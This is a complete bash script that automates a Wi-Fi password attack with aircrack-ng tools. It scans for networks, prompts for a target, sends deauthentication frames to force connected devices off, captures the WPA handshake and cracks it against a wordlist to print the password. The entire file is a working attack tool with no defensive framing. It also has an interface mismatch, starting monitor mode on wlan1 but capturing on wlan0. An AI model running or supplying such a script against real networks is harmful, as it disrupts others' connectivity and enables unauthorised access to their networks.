#!/bin/bash

if [ "$(id -u)" -ne 0 ]; then
    echo "Please run the script as root"
    exit 1
fi

echo "Killing conflicting processes..."
airmon-ng check kill

echo "Putting wlan1 into monitor mode..."
airmon-ng start wlan1

monitor_iface="wlan0"

echo "Searching for surrounding networks..."
desktop_path="/home/yourname/Desktop/MY-TARGET"
mkdir -p "$desktop_path"
file_path="$desktop_path/target_network"
airodump-ng $monitor_iface --output-format csv -w $file_path &

sleep 10

pkill -f "airodump-ng"

echo "Networks recorded. The data is:"
cat "$file_path-01.csv"

echo "Please enter the SSID of the target network: "
read target_ssid
echo "Please enter the BSSID of the target network: "
read target_bssid
echo "Please enter the channel of the target network: "
read target_channel

file_path="$desktop_path/$target_ssid"

echo "Starting packet capture on channel $target_channel for network $target_ssid..."
airodump-ng --bssid $target_bssid -c $target_channel -w $file_path $monitor_iface &

gnome-terminal -- bash -c "echo 'Deauthenticating devices connected to $target_ssid...'; aireplay-ng --deauth 10 -a $target_bssid wlan0; sleep 10; exit"

capture_duration=120
echo "Capturing packets for $capture_duration seconds..."
sleep $capture_duration

echo "Stopping airodump-ng..."
pkill -f "airodump-ng"

if [ -f "$file_path-01.cap" ]; then
    echo "WPA handshake captured successfully!"
else
    echo "Failed to capture WPA handshake. Please try again."
    exit 1
fi

wordlist_path="/home/yourname/Desktop/PASSLIST.txt"

echo "Attempting to crack the password using aircrack-ng..."
aircrack-ng -w $wordlist_path "$file_path-01.cap" -l /home/yourname/Desktop/$target_ssid-password.txt

if [ -f "/home/yourname/Desktop/$target_ssid-password.txt" ]; then
    echo "Password cracked successfully. The password is:"
    cat "/home/yourname/Desktop/$target_ssid-password.txt"
else
    echo "Failed to crack the password. Please try again."
    exit 1
fi

echo "Stopping monitor mode..."
airmon-ng stop $monitor_iface

echo "Operation completed."
